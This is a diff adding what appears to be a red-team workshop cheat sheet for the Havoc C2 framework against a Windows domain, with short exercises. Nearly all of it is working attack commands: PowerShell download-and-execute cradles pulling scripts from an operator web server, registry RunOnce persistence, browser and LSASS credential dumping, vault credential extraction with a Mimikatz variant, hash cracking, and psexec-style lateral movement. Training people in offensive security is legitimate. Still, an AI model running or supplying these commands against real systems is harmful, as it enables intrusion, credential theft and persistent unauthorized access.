@@ -1,0 +1,133 @@
+Download tools to the /opt Folder
+
+cd /opt
+
+sudo git clone https://github.com/Flangvik/SharpCollection
+
+sudo wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+You are encouraged to uplaod tools to the Workstation!!!, try and run them from the host as well
+
+To use the PowerShell Tools you will need to open a new terminal and just run a python web server "python -m http.server" on the directory holding the scripts and replace the IP with your IP
+
+##############################################################################################
+
+##############################################################################################
+
+Domain Enumeration
+
+PowerShell:
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://IP:8000/PowerView.ps1');Get-Domain
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://IP:8000/PowerView.ps1');Get-DomainUser
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://IP:8000/PowerView.ps1');Get-DomainUser |select samaccountname
+
+C#:
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/SharpView.exe Get-Domain
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/SharpView.exe Get-Domain -Properties samacconutname
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/SharpView.exe Get-DomainController
+
+Exercise:
+
+How many users are in the Domain?
+
+How many Computers are in the Domain?
+
+Who is Domain Admin?
+
+
+##############################################################################################
+
+##############################################################################################
+
+Persistence
+
+C#:
+
+Upload a file to any location of your choosing and name it accordingly, replace the command with the full path of your persistent payload
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/SharpStay.exe action=UserRegistryKey keyname=Debug keypath=Software\Microsoft\Windows\CurrentVersion\RunOnce command=C:\Users\mnovoa\Downloads\persistence.exe
+
+Exercise:
+
+Leave a persistence binary in the startup folder or Registry Key it is optional to focus on OPSEC but encouraged
+
+
+##############################################################################################
+
+##############################################################################################
+
+Privilege Escalation
+
+PowerShell:
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://IP:8000/PrivescCheck.ps1');Invoke-PrivescCheck
+
+C#:
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/SharpUp.exe audit
+
+##############################################################################################
+
+##############################################################################################
+
+Credential Access
+
+Dump from Browser:
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/SharpChromium.exe logins
+
+Dump Lsass via TaskMgr:
+
+nanodump -> Download: https://github.com/fortra/nanodump/raw/main/scripts/restore_signature -> pypykatz lsa minidump FILENAME.dmp
+
+View hashes and available creds from the DUMP using pypykatz
+
+pypykatz lsa minidump lsass.dmp
+
+Dump Credentials from Scheduled Tasks:
+
+dotnet inline-execute /opt/SharpCollection/NetFramework_4.5_x64/BetterSafetyKatz.exe "privilege::debug" "token::elevate" \"vault::cred /patch\" exit - //You will need to escape Double Quotes on the last command !># Careful not always work
+
+If tools on host machine you can use shell:
+
+shell BetterSafetyKatz.exe "privilege::debug" "token::elevate" \"vault::cred /patch\" exit - Escape Quotes on last command
+
+Hashcat Crack Hash
+
+hashcat.exe -m 0 -a 0 "hash.txt" "wordlist.txt"
+
+##############################################################################################
+
+##############################################################################################
+
+Lateral Movement
+
+This section will use built-in modules from Havoc, unfortunately some still do not work or didn't get compiled in the process while building Havoc to fix this please move onto: cd [Havoc Path]/client/Modules/Jump-Exec
+
+Once in the location use: sudo make
+
+Find Local Admin Access
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://IP:8000/Find-PSRemotingLocalAdminAccess.ps1');Find-PSRemotingLocalAdminAccess
+
+shell Sharp-FindWMIRemotingLocalAdminAcces.exes # If tool isn't working you can use this command to run it on a version saved locally should be used with full path
+
+############################
+You can abuild the SVC payload before continuing
+############################
+
+jump-exec psexec [Target] [Listener] [Local Path of SVC EXE]
+
+pivot connect [Target Host] [Pipe Name]
+
+This 3rd Party module needs to be compiled first
+
+LatLoader
+
+LatLoader load [Target Host] [Local EXE Path]
